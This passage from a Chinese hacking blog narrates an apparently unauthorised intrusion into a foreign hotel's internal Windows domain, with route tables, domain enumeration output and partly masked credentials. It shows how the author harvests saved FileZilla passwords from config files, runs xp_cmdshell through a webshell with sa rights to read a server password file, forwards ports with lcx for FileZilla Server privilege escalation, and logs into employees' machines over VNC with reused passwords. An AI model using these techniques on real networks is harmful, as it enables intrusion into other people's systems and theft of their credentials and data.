xx …… Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>0x10004 …00 14 85 02 00 x2 …… Broadcom NetXtreme Gigabit Ethernet</p>            <p>===========================================================================</p>            <p>===========================================================================</p>            <p>Active Routes:</p>            <p>Network Destination&#160;&#160;&#160;&#160;&#160;&#160;&#160; Netmask&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Gateway&#160;&#160;&#160;&#160;&#160;&#160; Interface&#160; Metric</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0.0.0.0&#160;&#160;&#160; 192.168.100.1&#160;&#160; 192.168.100.49&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0.0.0.0&#160;&#160;&#160; 192.168.100.1&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160; 255.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160; 1</p>            <p>&#160;&#160;&#160;&#160;&#160; 169.254.0.0&#160;&#160;&#160;&#160;&#160; 255.255.0.0&#160;&#160; 192.168.100.65&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160; 192.168.100.0&#160;&#160;&#160; 255.255.255.0&#160;&#160; 192.168.100.49&#160;&#160; 192.168.100.49&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160; 192.168.100.0&#160;&#160;&#160; 255.255.255.0&#160;&#160; 192.168.100.65&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.13&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.49&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.65&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.80&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.81&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.82&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.83&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160; 192.168.100.84&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.103&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.195&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.201&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.202&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.205&#160; 255.255.255.255&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 127.0.0.1&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.255&#160; 255.255.255.255&#160;&#160; 192.168.100.49&#160;&#160; 192.168.100.49&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 192.168.100.255&#160; 255.255.255.255&#160;&#160; 192.168.100.65&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 224.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160; 240.0.0.0&#160;&#160; 192.168.100.49&#160;&#160; 192.168.100.49&#160;&#160;&#160;&#160; 20</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 224.0.0.0&#160;&#160;&#160;&#160;&#160;&#160;&#160; 240.0.0.0&#160;&#160; 192.168.100.65&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160; 20</p>            <p>&#160; 255.255.255.255&#160; 255.255.255.255&#160;&#160; 192.168.100.49&#160;&#160; 192.168.100.49&#160;&#160;&#160;&#160;&#160; 1</p>            <p>&#160; 255.255.255.255&#160; 255.255.255.255&#160;&#160; 192.168.100.65&#160;&#160; 192.168.100.65&#160;&#160;&#160;&#160;&#160; 1</p>            <p>Default Gateway:&#160;&#160;&#160;&#160; 192.168.100.1</p>            <p>===========================================================================</p>            <p>Persistent Routes:</p>            <p>&#160; None</p>         </td>       </tr>     </tbody></table> </p>  <p>都处于同一个内网 那么有木有可能管理的用户密码都一样了 … 经过测试 用破出来用户密码跟mimikaz(这作者公布了源码 国内也有人给逆出来了 都是大牛啊)读出的明文测试登录都失败了 是这里有个用户b<strong>**</strong>z跟B域的名称是一样的 这之间肯定是有联系的. 咱们回头在翻翻之前的机器 部分机器安装了FileZilla客户端 找找FileZilla的帐号密码看看. C:\Documents and Settings\Administrator\Application Data这个目录存储些应用程序的配置信息 这里直接给出地址：</p>  <p>C:\Documents and Settings\Administrator\Application Data\FileZilla\recentservers.xml win2k3   <br>C:\Users\User\AppData\Roaming\FileZilla\recentservers.xml win2k8    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>&lt;FileZilla3&gt;</p>            <p>&#160;&#160;&#160; &lt;RecentServers&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Server&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Host&gt;ftp.b<strong><em>**</em></strong>z.com&lt;/Host&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Port&gt;21&lt;/Port&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Protocol&gt;0&lt;/Protocol&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Type&gt;0&lt;/Type&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;User&gt;x<strong><strong>x&lt;/User&gt;</strong></strong></p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Pass&gt;bz&lt;/Pass&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Logontype&gt;1&lt;/Logontype&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;TimezoneOffset&gt;0&lt;/TimezoneOffset&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;MaximumMultipleConnections&gt;0&lt;/MaximumMultipleConnections&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;EncodingType&gt;Auto&lt;/EncodingType&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;BypassProxy&gt;0&lt;/BypassProxy&gt;</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/Server&gt;</p>            <p>&#160;&#160;&#160; &lt;/RecentServers&gt;</p>            <p>&lt;/FileZilla3&gt;</p>         </td>       </tr>     </tbody></table> </p>  <p>那么这个ftp的内网地址多少呢 扫了下内网IP的端口 发现开21的就几台 一个个测试后 确定此ftp就是B域下的192.168.100.101，那么这是台啥机器呢，打开80端口看看 如图:   <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/101.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="101" border="0" alt="clip_image007" src="http://img.cker.in/hotel_13F2D/clip_image007.jpg" width="570" height="370"></a>    <br>是台Dlink路由器 而网关100.1是sonicwall 我们看看ftp里面能找到什么可用的信息 从rar里找到了web.config文件 有个数据库连接地址为192.168.21.10的IP，发现可以ping通 telnet开放了21跟3389 用数据库帐号密码猜测登录了ftp 发现没啥可利用的. 在webshell里链接mssql得到sa权限(注意大小写,这里纠结了会)    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/21.10.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="21.10" border="0" alt="clip_image008" src="http://img.cker.in/hotel_13F2D/clip_image008.jpg" width="570" height="231"></a>    <br>先看看服务器基本信息 篇幅原因 我就不贴太多.</p>  <p>一波未平一波又起</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : H<strong>*-DC01&#160;&#160;&#160;&#160;&#160;&#160;&#160; </strong></p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : hg.com&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Hxxxd&#160;&#160;&#160; </p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : hg<strong>.com </strong></p>         </td>       </tr>     </tbody></table> </p>  <p>存在域 192.168.21.x段的<a href="http://ha.cker.in/tag/内网渗透" target="_blank">内网</a>. dsquery server -o rdn了解到只有一台域控而且就是本机（这年头踩狗屎滴人特别多）来看看有几个域    <br>net view /domain    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>——————————————————————————-&#160;&#160;&#160;&#160; </p>            <p>HG&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>MS<strong>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </strong></p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>本机处在HG域里 看看有多少台机器 如图：   <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/hgserver.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="hgserver" border="0" alt="clip_image009" src="http://img.cker.in/hotel_13F2D/clip_image009.jpg" width="570" height="370"></a>    <br>MS<strong>域    <br>[EXEC master..xp_cmdshell ‘net view /domain:MS</strong>‘]    <br>Server Name Remark    <br>——————————————————————————-    <br>\ZE<strong><strong>X    <br>The command completed successfully.    <br>这3389的密码没有猜出来 net user有个把账户存在但是没破出密码 本来直接添加个domain admins用户 可whoami发现权限处在domain users组里 这回权限只存在此组里 其他别多想. 有了sa 先dir下看看都安全了什么软件 发现了FileZilla server版 之前都是client版没啥用，这个server版可以提权的    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/21.10-ftp.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="21.10-ftp" border="0" alt="clip_image010" src="http://img.cker.in/hotel_13F2D/clip_image010.jpg" width="570" height="370"></a>    <br>type读出FileZilla Server Interface.xml    <br>EXEC master..xp_cmdshell ‘type c:\&quot;Program Files (x86)\FileZilla Server\FileZilla Server Interface.xml&quot;’    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>&lt;FileZillaServer&gt; |&#160;&#160; </p>            <p>&#160;&#160;&#160; &lt;Settings&gt;&#160;&#160;&#160; |&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Last Server Address&quot; type=&quot;string&quot;&gt;127.0.0.1&lt;/Item&gt;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Last Server Port&quot; type=&quot;numeric&quot;&gt;14147&lt;/Item&gt;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Last Server Password&quot; type=&quot;string&quot;&gt;B</p></td></tr></tbody></table></strong></strong>z&lt;/Item&gt;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Always use last server&quot; type=&quot;numeric&quot;&gt;1&lt;/Item&gt;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;User Sorting&quot; type=&quot;numeric&quot;&gt;0&lt;/Item&gt;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Start Minimized&quot; type=&quot;numeric&quot;&gt;1&lt;/Item&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;Item name=&quot;Filename Display&quot; type=&quot;numeric&quot;&gt;1&lt;/Item&gt;&#160;&#160; </p>            <p>&#160;&#160;&#160; &lt;/Settings&gt;&#160;&#160; |&#160;&#160; </p>            <p>&lt;/FileZillaServer&gt;&#160;&#160;&#160; </p>                      <p></p>  <p>密码跟ftp用户密码一样 FileZilla Server提权这里要注意版本的问题 不然也成功不了 出错如:</p>  <p>Protocol warning: Server version mismatch: Server version is 0.9.55.0, interface version is 0.9.65.0   <br>Protocol error: Protocol version mismatch: Server protocol version is 0.1.11.0, interface protocol version is 0.1.13.0    <br>Connection to server closed.</p>  <p>lcx转发本地监听成功添加了一个对c盘的操作权限，但是替换sethc还是木有权限 不解释. 翻了下用户目录发现有个用户存在于之前所拿的机器中 通过之前的hash破解了此用户 但登录上去还是domain users权限. net group &quot;domain computers&quot; 如图：   <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/21.10-2.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="21.10-2" border="0" alt="clip_image011" src="http://img.cker.in/hotel_13F2D/clip_image011.jpg" width="570" height="370"></a>    <br>其实扫了下21 1433 3389 5900端口，发现都开了vnc端口 直接连接用之前收集到的3个vnc密码测试均可以拿下 这个段的基本都是员工机器 vnc连上能看到有的在敲代码写.net 有的还在发email 有的好像是收银的界面 另个域机器都在这内网段 这里就不蛋疼的截图了.但是域管理员权限还没拿到 大伙们可以试试win2k8提权工具搞搞 这里略.</p>  <p>截稿</p>  <p>为啥不继续了呢 因为上面在web.config找了一个新的内网段21.x 这里我又翻了下在一个rar压缩包了找到了web.config里有N个内网段   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1097">           <p>&lt;add name=&quot;27&quot;&#160; connectionString=&quot;Data Source=192.168.51.11;Initial Catalog=B<strong>ne;User ID=B**</strong>z;Password=B<strong>**z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</strong></p>            <p>&lt;add name=&quot;29&quot;&#160; connectionString=&quot;Data Source=192.168.21.10;Initial Catalog=Merne;User ID=B<strong><strong>z;Password=B</strong></strong>z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</p>            <p>&lt;add name=&quot;30&quot;&#160; connectionString=&quot;Data Source=192.168.11.2;Initial Catalog=H<strong>H;User ID=B**</strong>z;Password=B<strong><em>*z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</em></strong></p>            <p>&lt;add name=&quot;36&quot;&#160; connectionString=&quot;Data Source=192.168.71.11;Initial Catalog=HA;User ID=B<strong><strong>z;Password=B</strong></strong>z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</p>            <p>&lt;add name=&quot;37&quot;&#160; connectionString=&quot;Data Source=192.168.31.11;Initial Catalog=Chr<strong><em>ch;User ID=B*</em></strong>z;Password=B<strong><em>*z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</em></strong></p>            <p>&lt;add name=&quot;39&quot;&#160; connectionString=&quot;Data Source=192.168.41.11;Initial Catalog=AucndA;User ID=B<strong><strong>z;Password=B</strong></strong>z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</p>            <p>&lt;add name=&quot;59&quot;&#160; connectionString=&quot;Data Source=192.168.61.11;Initial Catalog=La<strong><em>ston;User ID=B*</em></strong>z;Password=B<strong><em>*z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</em></strong></p>            <p>&lt;add name=&quot;38&quot;&#160; connectionString=&quot;Data Source=10.4.4.25;Initial Catalog=JCC;User ID=B<strong><strong>z;Password=B</strong></strong>z&quot; providerName=&quot;System.Data.SqlClient&quot;/&gt;</p>         </td>       </tr>     </tbody></table> </p>  <p>好吧 扫了下存活机器挺多 数据库密码都一样 也有几个域 还有前面的域net group &quot;domain computers&quot;一下还有很多机器 都省略 方法跟上面都差不多 就不继续了（回头俺自己整） 文章主要跟着思路走 这里<a href="http://www.pentesting.cc/" target="_blank" rel="external">arp</a> -a和查看路由表都没发现存在其他内网段 但从web.config里发现了新大陆 细心点会有很多发现 这个B域2台win2k8和一个dlink，win2k8用上面破出来的密码可以登录 但权限也是domain users组，篇幅原因 不多写 东西都在我的txt里 因为我后面还有几个内网域跟linux内网的文章没写 这里不花太多时间了 thx.</p>  <p>作者链接<a href="http://www.pentesting.cc/on-some-hotel-internal-network-domain-infiltration-cases.html" target="_blank" rel="external">http://www.pentesting.cc/on-some-hotel-internal-network-domain-infiltration-cases.html</a></p>  
	</div>
		<footer class="article-footer clearfix">
<div class="article-share" id="share">

  
<!-- JiaThis Button BEGIN -->
<div class="jiathis_style">
    <span class="jiathis_txt">分享到：</span>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_weixin"></a>
    <a class="jiathis_button_renren"></a>
    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
    <a class="jiathis_counter_style"></a>
</div>
<script type="text/javascript">
var jiathis_config = {data_track_clickback:'true'};
</script>
<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
<!-- JiaThis Button END -->



</div>

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tag/Webshell/">Webshell</a><a href="/tag/内网渗透/">内网渗透</a>
  </div>


</footer>   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/953.seo/" title="当Discuz!遇上xsser.me：基础认证钓鱼">
  <strong>Prev:</strong><br/>
  <span>
  当Discuz!遇上xsser.me：基础认证钓鱼</span>
</a>
</div>


<div class="next">
<a href="/951.seo/"  title="深夜劫持雾隐技术小组">
 <strong>Next:</strong><br/> 
 <span>深夜劫持雾隐技术小组
</span>
</a>
</div>

</nav>

	<!-- 多说-->

<section class="comment">
<div class="ds-thread" data-thread-key="post-对国外某hotel的内网域渗透案例" data-title="对国外某hotel的内网域渗透案例" data-url="http://ha.cker.in/952.seo/"></div>
</section>
<!-- disqus-->


</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  <p class="asidetitle">关注</p>
<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2424683170&verifier=1d07a1a0&dpc=1"></iframe>



  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
		
			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
		
			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
		
			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
		
			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
		
			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
		
			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
		
			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
		
			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
		
			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
		
			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
		
			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
		
			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
		
			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
		
			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
		
			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
		
			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
		
			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
		
			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
		
			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
		
			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
		
			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
		
			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
		
			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
		
			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
		
			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
		
			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
		
			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
		
			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
		
			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
		
			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
		
			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
      <li></li>
      <li></li>
      <li></li>
    </ul>
</div>


  <div class="rsspart">
	<a href="atom.xml" target="_blank" title="rss">RSS</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	
	<section class="info">
		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
		
		
		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
		
		
		<a href="https://github.com/333" target="_blank" title="github"></a>
		
		
	</div>
		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
		
		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.1.0.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else
    {
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      h  = $('article h2')
      ah = $('article h2'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  if(ah.length==0){
    t.css('display','none');
  }else{
    c.click(function(){
      ta.css('display', 'block').addClass('fadeIn');
    });
    o.click(function(){
      ta.css('display', 'none');
    });
    $(window).scroll(function(){
      ta.css("top",Math.max(140,320-$(this).scrollTop()));
    });
  };
});
</script>



<script type="text/javascript">
  var duoshuoQuery = {short_name:"dreajaygithubblog"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script> 








<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
</script>

<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
</div>
<script type="text/javascript">
	(function($) { 
		// When to show the scroll link
		// higher number = scroll link appears further down the page   
		var upperLimit = 300;
		
		// Our scroll link element
		var scrollElem = $('#totop');
	   
		// Scroll to top speed
		var scrollSpeed = 800;
	   
		// Show and hide the scroll to top link based on scroll position   
		scrollElem.hide();
		$(window).scroll(function () {            
			var scrollTop = $(document).scrollTop();       
